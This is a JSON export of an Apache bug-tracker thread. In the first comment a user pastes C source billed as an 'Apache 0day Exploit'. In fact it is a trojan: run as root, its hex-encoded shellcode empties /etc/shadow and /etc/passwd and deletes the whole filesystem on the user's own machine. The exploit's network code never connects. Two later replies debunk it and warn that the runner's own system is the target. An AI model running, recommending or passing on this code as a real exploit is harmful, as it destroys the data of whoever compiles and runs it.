[{"attachment_id": null, "tags": [], "creator": "johnmusbach1@gmail.com", "is_private": false, "count": 0, "id": 174571, "time": "2014-04-15T05:30:23Z", "bug_id": 56411, "creation_time": "2014-04-15T05:30:23Z", "text": "/*\nExploit  : Apache 0day Exploit\nAuthor:  : okno\nCompile  : gcc  -W apache0.c -o apache0\nUsage:   : ./0apache HOST IP\nThanks   : ergufo, stutm, mz, ascii\n*/\n\n#include <stdio.h>\n#include <netdb.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <arpa/inet.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\nvoid usage(char *argv[])\n{\n  printf(\"Target : Apache 2.2.22 to Apache 2.4.2\\n\");\n  printf(\"Type   : 0day\\n\");\n  printf(\"Author : okno mail@pawelzorzan.eu\\n\");\n  printf(\"Web    : http://www.pawelzorzan.eu\\n\");\n  printf(\"Exec   : %s <serverapache> <porta>\\n\\n\", argv[0]);\n  exit(1);\n}\n\nunsigned char shellcode[] = \n\"\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\"\n\"\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x39\\x00\\x00\\x00\\x65\"\n\"\\x63\\x68\\x6f\\x20\\x22\\x22\\x20\\x3e\\x20\\x2f\\x65\\x74\\x63\\x2f\\x73\"\n\"\\x68\\x61\\x64\\x6f\\x77\\x20\\x3b\\x20\\x65\\x63\\x68\\x6f\\x20\\x22\\x22\"\n\"\\x20\\x3e\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x20\"\n\"\\x3b\\x20\\x72\\x6d\\x20\\x2d\\x52\\x66\\x20\\x2f\\x00\\x57\\x53\\x89\\xe1\"\n\"\\xcd\\x80\";\n\nint main(int argc, char *argv[])\n{\n  int uid = getuid();\n  int porta = 80, sock;\n  struct hostent *host;\n  struct sockaddr_in addr;\n\n  if(uid !=0)\n  {\n    fprintf(stderr, \"- Error - Need ROOT lamah!!\\n\");\n    exit(1);\n  }\n  if(uid == 0)\n  {\n    printf(\"\\t+ OK Exploitting..\\n\");\n  }\n  if(argc != 3)\n       usage(argv);\n\n  fprintf(stderr, \"- FUCK\\n\");\n  (*(void(*)())shellcode)();\n  exit(1);\n  char payload[1024];\n  memcpy(payload, &shellcode, sizeof(shellcode));\n  if(connect(sock,(struct sockaddr*)&addr,sizeof(addr))==0)\n  {\n    printf(\"+ OK we are in... Se non capisci SIAMO DENTRO!\\n\");\n    system(\"/bin/sh\");\n  }\n  else if(connect(sock,(struct sockaddr*)&addr, sizeof(addr))==-1)\n  {\n    fprintf(stderr, \"- Failed! You suck & Your mother too!!\\n\");\n    exit(1);\n  }\n}"}, {"count": 1, "text": "I found it by googling for apache 2.2.22 exploits, the source is http://pastebin.com/j70T9KHJ. Scary!", "creator": "johnmusbach1@gmail.com", "is_private": false, "id": 174572, "time": "2014-04-15T05:33:17Z", "bug_id": 56411, "creation_time": "2014-04-15T05:33:17Z", "tags": [], "attachment_id": null}, {"count": 2, "tags": [], "text": "Hmm, this exploit does not even connect anything and the payload has nothing to do with HTTP. Except eyes, it won't hurt much...", "attachment_id": null, "bug_id": 56411, "id": 174578, "time": "2014-04-15T07:25:44Z", "creator": "ylavic.dev@gmail.com", "creation_time": "2014-04-15T07:25:44Z", "is_private": false}, {"count": 3, "tags": [], "text": "Don't compile/run it on your local system though, it's probably the target.", "attachment_id": null, "bug_id": 56411, "id": 174580, "time": "2014-04-15T08:06:00Z", "creator": "ylavic.dev@gmail.com", "creation_time": "2014-04-15T08:06:00Z", "is_private": false}]